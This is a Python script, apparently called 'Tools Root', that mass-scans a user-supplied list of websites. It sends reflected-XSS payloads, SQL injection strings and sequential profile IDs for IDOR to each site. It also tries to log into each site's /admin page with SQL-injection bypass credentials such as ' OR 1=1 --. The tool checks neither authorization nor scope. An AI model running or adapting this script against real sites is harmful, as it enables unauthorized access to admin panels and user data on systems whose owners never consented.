import requests
import os
import pandas as pd
from colorama import Fore, init
from tqdm import tqdm
import pyfiglet

init(autoreset=True)

# Payloads for vulnerabilities
xss_payloads = ["<script>alert('XSS')</script>", "<img src='x' onerror='alert(1)'>"]
sql_payloads = ["' OR 1=1 --", '" OR "a"="a', "' UNION SELECT NULL, NULL --"]
idor_user_ids = [1, 2, 3, 999]
bypass_payloads = [
    {"username": "' OR 1=1 --", "password": "any"},
    {"username": "admin", "password": "' OR '1'='1"},
    {"username": "root", "password": "' UNION SELECT 1,2,3 --"}
]

# Vulnerability scan functions
def scan_xss(url):
    results = []
    for payload in xss_payloads:
        try:
            response = requests.get(f"{url}?q={payload}", timeout=10)
            if payload in response.text:
                results.append({"Path": f"{url}?q={payload}", "Payload": payload})
        except requests.exceptions.RequestException:
            continue
    return results

def scan_sql_injection(url):
    results = []
    for payload in sql_payloads:
        try:
            response = requests.get(f"{url}?id={payload}", timeout=10)
            if "syntax" in response.text.lower() or "mysql" in response.text.lower():
                results.append({"Path": f"{url}?id={payload}", "Payload": payload})
        except requests.exceptions.RequestException:
            continue
    return results

def scan_idor(url):
    results = []
    for user_id in idor_user_ids:
        path = f"{url}/profile/{user_id}"
        try:
            response = requests.get(path, timeout=10)
            if response.status_code == 200 and "user" in response.text.lower():
                results.append({"Path": path, "Payload": f"User ID: {user_id}"})
        except requests.exceptions.RequestException:
            continue
    return results

def bypass_admin_panel(admin_url):
    results = []
    for payload in bypass_payloads:
        try:
            response = requests.post(admin_url, data=payload, timeout=10)
            if "dashboard" in response.text.lower() or "welcome" in response.text.lower():
                results.append({"Path": admin_url, "Payload": payload})
                break
        except requests.exceptions.RequestException:
            continue
    return results

# Discover admin panel and scan bypass
def discover_and_bypass_admin(url):
    admin_url = f"{url}/admin"
    try:
        response = requests.get(admin_url, timeout=10)
        if response.status_code == 200 and "login" in response.text.lower():
            return bypass_admin_panel(admin_url)
    except requests.exceptions.RequestException:
        pass
    return []

# Main scan function
def scan_site(url):
    xss_results = scan_xss(url)
    sql_results = scan_sql_injection(url)
    idor_results = scan_idor(url)
    bypass_results = discover_and_bypass_admin(url)
    return {
        "XSS": xss_results,
        "SQL Injection": sql_results,
        "IDOR": idor_results,
        "Admin Bypass": bypass_results
    }

# Display results in separate tables
def display_results(all_results):
    for vuln_type, results in all_results.items():
        if results:
            print(Fore.GREEN + f"\nResults for {vuln_type}:")
            df = pd.DataFrame(results)
            print(Fore.GREEN + df.to_string(index=False))
        else:
            print(Fore.RED + f"\nNo {vuln_type} vulnerabilities detected.")

# Entry point
def main():
    print(Fore.CYAN + pyfiglet.figlet_format("Tools Root", font="slant"))
    filename = input(Fore.CYAN + "Enter the file containing URLs (e.g., list.txt): ")

    if not os.path.exists(filename):
        print(Fore.RED + f"File '{filename}' not found.")
        return

    with open(filename, 'r') as file:
        urls = [line.strip() for line in file.readlines()]

    all_vulnerabilities = {"XSS": [], "SQL Injection": [], "IDOR": [], "Admin Bypass": []}
    for url in tqdm(urls, desc="Scanning Sites", ncols=100):
        site_results = scan_site(url)
        for vuln_type, results in site_results.items():
            all_vulnerabilities[vuln_type].extend(results)

    print(Fore.CYAN + "\nScan completed. Results:")
    display_results(all_vulnerabilities)

if __name__ == "__main__":
    main()
